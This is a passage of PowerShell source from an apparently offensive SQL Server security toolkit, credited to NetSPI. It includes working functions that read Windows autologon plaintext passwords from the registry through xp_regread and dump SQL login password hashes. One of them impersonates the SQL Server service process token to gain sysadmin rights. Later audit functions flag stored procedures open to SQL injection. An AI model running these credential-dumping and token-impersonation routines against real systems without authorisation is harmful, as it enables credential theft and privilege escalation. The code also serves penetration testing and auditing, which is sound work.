        [string]$FilePath
    )

    Begin
    {
        # Table for output
        $TblFileInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblFileInstances.Columns.Add('ComputerName')
        $null = $TblFileInstances.Columns.Add('Instance')
    }

    Process
    {
        # Test file path
        if(Test-Path $FilePath)
        {
            Write-Verbose -Message 'Importing instances from file path.'
        }
        else
        {
            Write-Output -InputObject 'File path does not appear to be valid.'
            break
        }

        # Grab lines from file
        Get-Content -Path $FilePath |
        ForEach-Object -Process {
            $Instance = $_
            if($Instance.Split(',')[1])
            {
                $ComputerName = $Instance.Split(',')[0]
            }
            else
            {
                $ComputerName = $Instance.Split('\')[0]
            }

            # Add record
            if($_ -ne '')
            {
                $null = $TblFileInstances.Rows.Add($ComputerName,$Instance)
            }
        }
    }

    End
    {

        # Status User
        $FileInstanceCount = $TblFileInstances.rows.count
        Write-Verbose -Message "$FileInstanceCount instances where found in $FilePath."

        # Return data
        $TblFileInstances
    }
}

Function   Get-SQLRecoverPwAutoLogon
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblWinAutoCreds = New-Object -TypeName System.Data.DataTable
        $TblWinAutoCreds.Columns.Add("ComputerName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Instance") | Out-Null
        $TblWinAutoCreds.Columns.Add("Domain") | Out-Null
        $TblWinAutoCreds.Columns.Add("UserName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Password") | Out-Null
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Get SQL Server version number
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Check if this can actually run with the current login
        if($IsSysadmin -ne "Yes")
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }

        # Get default auto login Query
        $DefaultQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get AutoLogin Default Domain
        DECLARE @AutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultDomainName',
        @value			= @AutoLoginDomain output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultUserName',
        @value			= @AutoLoginUser output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultPassword',
        @value			= @AutoLoginPassword output

        -- Display Results
        SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword"

        # Execute Default Query
        $DefaultResults = Get-SQLQuery -Instance $Instance -Query $DefaultQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose     
        $DefaultUsername = $DefaultResults.Username
        if($DefaultUsername.length -ge 2){

            # Add record to data table
            $DefaultResults | ForEach-Object{                
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }                    
        }else{
            Write-Verbose "$Instance : No default auto login credentials found."
        }

        # Get default alt auto login Query
        $AltQuery = "
        -------------------------------------------------------------------------
        -- Get Alternative Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get Alt AutoLogin Default Domain
        DECLARE @AltAutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultDomainName',
        @value			= @AltAutoLoginDomain output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultUserName',
        @value			= @AltAutoLoginUser output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultPassword',
        @value			= @AltAutoLoginPassword output

        -- Display Results
        SELECT Domain = @AltAutoLoginDomain, Username = @AltAutoLoginUser, Password = @AltAutoLoginPassword"

        # Execute Default Query
        $AltResults = Get-SQLQuery -Instance $Instance -Query $AltQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $AltUsername = $AltResults.Username
        if($AltUsername.length -ge 2){                            

             # Add record to data table
            $AltResults | ForEach-Object{               
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            Write-Verbose "$Instance : No alternative auto login credentials found."
        }
    }

    End
    {
        # Return data
         $TblWinAutoCreds 
    }
}


Function Get-SQLServerPolicy
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblPolicyInfo = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = " -- Get-SQLServerPolicy.sql 
                SELECT '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                    p.policy_id,
		            p.name as [PolicyName],
		            p.condition_id,
		            c.name as [ConditionName],
		            c.facet,
		            c.expression as [ConditionExpression],
		            p.root_condition_id,
		            p.is_enabled,
		            p.date_created,
		            p.date_modified,
		            p.description, 
		            p.created_by, 
		            p.is_system,
                    t.target_set_id,
                    t.TYPE,
                    t.type_skeleton
                FROM msdb.dbo.syspolicy_policies p
                INNER JOIN msdb.dbo.syspolicy_conditions c 
	                ON p.condition_id = c.condition_id
                INNER JOIN msdb.dbo.syspolicy_target_sets t
	                ON t.object_set_id = p.object_set_id"

        # Execute Query
        $TblPolicyInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append as needed
        $TblPolicyInfo = $TblPolicyInfo + $TblPolicyInfoTemp
    }

    End
    {
        # Count 
        $PolNum = $TblPolicyInfo.Count
        if($PolNum -eq 0){

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : No policies found."
            }
        }
        
        # Return data
        $TblPolicyInfo
    }
}


Function  Get-SQLServerPasswordHash
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Migrate to SQL Server process.')]
        [switch]$Migrate,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblPasswordHashes = New-Object -TypeName System.Data.DataTable
        $null = $TblPasswordHashes.Columns.Add('ComputerName')
        $null = $TblPasswordHashes.Columns.Add('Instance')
        $null = $TblPasswordHashes.Columns.Add('PrincipalId')
        $null = $TblPasswordHashes.Columns.Add('PrincipalName')
        $null = $TblPasswordHashes.Columns.Add('PrincipalSid')
        $null = $TblPasswordHashes.Columns.Add('PrincipalType')
        $null = $TblPasswordHashes.Columns.Add('CreateDate')
        $null = $TblPasswordHashes.Columns.Add('DefaultDatabaseName')
        $null = $TblPasswordHashes.Columns.Add('PasswordHash')

        # Setup CredentialName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }else{
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }

            # If the migrate flag is set dont't return and attempt to migrate
            if($Migrate)
            {
                # Get current user name
                $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

                # Verify local administrator privileges
                $IsAdmin = Get-SQLLocalAdminCheck
                
                # Return if the current user does not have local admin privs
                if($IsAdmin -ne $true){
                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
                }

                # Check for running sql service processes that match the instance
                Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
                # Return if no matches exist
                if ($TargetPid -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }

                # Status user if a match is found
                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
                
                # Attempt impersonation 
                try{
                    Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{            
                return
            }
        }            

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq 'Yes')
        {
            Write-Verbose -Message "$Instance : You are a sysadmin."
        }
        else
        {
            Write-Verbose -Message "$Instance : You are not a sysadmin."
            if($Migrate)
            {
                # Get current user name
                $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

                # Verify local administrator privileges
                $IsAdmin = Get-SQLLocalAdminCheck
                
                # Return if the current user does not have local admin privs
                if($IsAdmin -ne $true){
                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
                }

                # Check for running sql service processes that match the instance
                 Write-Verbose -Message "$Instance : Impersonating SQL Server process:"  
                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
                # Return if no matches exist
                if ($TargetPid -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }

                # Status user if a match is found
                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
                
                # Attempt impersonation 
                try{
                    Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{
                return
            }
        
        }

        # Status user
        Write-Verbose -Message "$Instance : Attempting to dump password hashes."

        # Check version
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        if([int]$SQLVersionShort -le 8)
        {

            # Define Query
            $Query = "USE master;
                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
                createdate as [CreateDate],
			    dbname as [DefaultDatabaseName],
			    password as [PasswordHash]
                FROM [sysxlogins]"
        }
		else
        {
            # Define Query
            $Query = "USE master;
                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
			    principal_id as [PrincipalId],
			    type_desc as [PrincipalType],
                sid as [PrincipalSid],
                create_date as [CreateDate],
			    default_database_name as [DefaultDatabaseName],
			    [sys].fn_varbintohexstr(password_hash) as [PasswordHash]
                FROM [sys].[sql_logins]"
        }

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblPasswordHashes.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $Sid,
                [string]$_.PrincipalType,
                $_.CreateDate,
                [string]$_.DefaultDatabaseName,
                [string](-join('0x0',(($_.PasswordHash).ToUpper().TrimStart("0X"))))
                )
        }

        # Status user
        Write-Verbose -Message "$Instance : Attempt complete."
        
        # Revert to original user context
        if($Migrate){          
            Invoke-TokenManipulation -RevToSelf | Out-Null
        }       
    }

    End
    {

        # Get hash count
        $PasswordHashCount = $TblPasswordHashes.Rows.Count
        write-verbose "$PasswordHashCount password hashes recovered."

        # Return table if hashes exist
        if($PasswordHashCount -gt 0){

            # Return data
            $TblPasswordHashes            
        }
    }
}

Function Invoke-SQLAuditSQLiSpExecuteAs
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER."
            Return
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Potential SQL Injection - EXECUTE AS OWNER'
        $Description   = 'The affected procedure is using dynamic SQL and the "EXECUTE AS OWNER" clause.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.'
        $Remediation   = 'Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the "EXECUTE AS OWNER" clause.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -Keyword `"EXECUTE AS OWNER`"'"
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes"
                
        # Get SP with dynamic sql and execute as owner
        $SQLiResults = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Keyword "EXECUTE AS OWNER" 
        
        # Check for results
        if($SQLiResults.rows.count -ge 1){
            
            # Confirmed vulnerable
            $IsVulnerable = "Yes"
            $IsExploitable = "Unknown"

            # Add information to finding for each instance of potential sqli
            $SQLiResults |
            ForEach-Object{
            
                # Set instance values
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                $ObjectName = "$DatabaseName.$SchemaName.$ProcedureName"
                $Details =  "The $ObjectName stored procedure is affected."
                
                # Add to report 
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)        
            }
        }    

        # ------------------------------------------------------------------
        # Exploit Vulnerability
        # ------------------------------------------------------------------
        if($Exploit){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}

Function Invoke-SQLAuditSQLiSpSigned
{
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login."
            Return
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Potential SQL Injection - Signed by Certificate Login'
        $Description   = 'The affected procedure is using dynamic SQL and has been signed by a certificate login.  As a result, it may be possible to impersonate signer if SQL injection is possible.'
        $Remediation   = 'Consider using parameterized queries instead of concatenated strings.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -OnlySigned"
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes"
                
        # Get SP with dynamic sql and execute as owner
        $SQLiResults = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -OnlySig
        
        # Check for results
        if($SQLiResults.rows.count -ge 1){
            
            # Confirmed vulnerable
            $IsVulnerable = "Yes"
            $IsExploitable = "Unknown"

            # Add information to finding for each instance of potential sqli
            $SQLiResults |
            ForEach-Object{
            
                # Set instance values
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                $ObjectName = "$DatabaseName.$SchemaName.$ProcedureName"
                $Details =  "The $ObjectName stored procedure is affected."
                
                # Add to report 
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)        
            }
        }    


        if($Exploit){
            Write-Verbose "$Instance : No automatic exploitation option has been provided. Uninformed exploitation of SQLi can have a negative impact on production environments."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - Signed by Certificate Login"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}




Function Invoke-SQLAuditPrivServerLink
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Server Link"

